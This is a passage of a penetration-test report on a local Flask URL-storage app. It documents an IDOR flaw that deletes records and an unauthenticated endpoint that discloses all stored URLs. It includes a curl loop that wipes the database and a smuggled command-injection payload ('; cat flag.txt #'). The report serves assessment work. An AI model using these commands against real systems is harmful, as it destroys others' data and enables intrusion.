- **Database Schema:** URL model has no `user_id` column, making ownership validation architecturally impossible
- **Attack Vector:** Sequential integer IDs (1, 2, 3, ...) are trivially enumerable
- **CSRF Vulnerability:** No CSRF token required, enabling remote exploitation via malicious HTML

**Notes:**

This is a textbook horizontal privilege escalation vulnerability. The application:
1. Has no authentication system (no user accounts exist)
2. Has no ownership tracking in database schema (URL model lacks user_id)
3. Has no authorization checks before database deletion
4. Uses predictable sequential integer IDs

An attacker can delete the entire database with a simple loop:
```bash
for i in {1..100}; do curl -X POST http://localhost:5094/delete_url/$i; done
```

This vulnerability enables mass data destruction denial-of-service attacks against the application.

---

### AUTHZ-VULN-02: Information Disclosure - Unauthorized Access to All URLs

**Summary:**
- **Vulnerable location:** `GET /` endpoint (app.py:43-46)
- **Overview:** Successfully demonstrated horizontal information disclosure through unauthorized access to all URLs in database without authentication or user-scoped filtering
- **Impact:** Privacy violation - any anonymous attacker can view all stored URLs which may contain sensitive data in query parameters (API keys, tokens, session IDs, internal endpoints, PII)
- **Severity:** HIGH

**Prerequisites:** None - vulnerability exploitable without any authentication or credentials

**Exploitation Steps:**

1. **Access homepage without authentication:**
   ```bash
   curl http://localhost:5094/
   ```
   **Result:** HTTP 200 OK response containing full list of all URLs in database

2. **Verify no authentication required:**
   ```bash
   curl -v http://localhost:5094/ 2>&1 | grep "^> "
   ```
   **Output:**
   ```
   > GET / HTTP/1.1
   > Host: localhost:5094
   > User-Agent: curl/8.7.1
   > Accept: */*
   ```
   **Result:** No Authorization header, no Cookie header, no session - completely anonymous access

3. **Extract all URLs from response:**
   ```bash
   curl -s http://localhost:5094/ > homepage.html
   # View the HTML - all URLs visible in <li> elements with delete buttons
   ```
   **Result:** Complete database dump visible in HTML response

4. **Confirm global query without user filtering:**
   - Vulnerable code at `app.py:45`: `urls = URL.query.all()`
   - No WHERE clause filtering by user_id
   - No authentication check before query execution
   - All records returned to all requesters (including anonymous)

**Proof of Impact:**

**Unauthorized Data Access:**
- Accessed `GET http://localhost:5094/` without any credentials
- Received HTTP 200 OK response with complete URL listing
- No authentication headers required (verified via curl -v output)

**Sensitive Data Exposed:**
Observed URLs visible to anonymous attacker:
1. `http://127.0.0.1:5003/add_url` - Internal endpoint exposure
2. `"http://example.com"; cat flag.txt #` - Command injection payloads visible (multiple instances)
3. Additional URLs containing potentially sensitive internal paths

**Database Query Analysis:**
- **Vulnerable Code:** `app.py:45` - `urls = URL.query.all()`
- **Issue:** Retrieves ALL records globally without user filtering
- **Missing Control:** No authentication check, no `WHERE user_id = current_user.id` clause
- **Impact:** Complete database enumeration by unauthenticated users

**Privacy Violation Examples:**
URLs may contain sensitive data in query parameters:
- API keys: `http://api.example.com/?key=secret123`
- Session tokens: `http://app.com/page?session=abc123`
- Authentication credentials: `http://admin:password@internal.server.com`
- PII: `http://example.com/user?email=victim@example.com`
- Internal network topology: `http://172.16.0.5:8080/admin`

All such sensitive data is exposed to anonymous attackers through this information disclosure vulnerability.

**Technical Evidence:**
- **Request:** `GET / HTTP/1.1` with no authentication headers
- **Response:** HTTP 200 OK with full HTML rendering of all URLs
- **Query:** SQLAlchemy `URL.query.all()` returns entire table without filtering
- **User Context:** None - no user identity concept exists in application
- **Authorization Check:** None - endpoint proceeds directly to database query

**Notes:**

This vulnerability demonstrates complete absence of access control:
1. No authentication required (public endpoint)
2. No user-scoped queries (no WHERE clause filtering)
3. No role-based access control
4. Database schema lacks user_id column for ownership

The application treats all data as globally accessible. Combined with AUTHZ-VULN-01, an attacker can:
1. Enumerate all URLs via information disclosure
2. Delete all URLs via IDOR
3. Cause complete data loss and service disruption

This is a fundamental architectural security flaw - the URL model has no ownership tracking:
```python
# app.py:12-14
class URL(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    url = db.Column(db.String(255), nullable=False)
    # Missing: user_id column for ownership
```

Without user associations, user-scoped authorization is architecturally impossible.
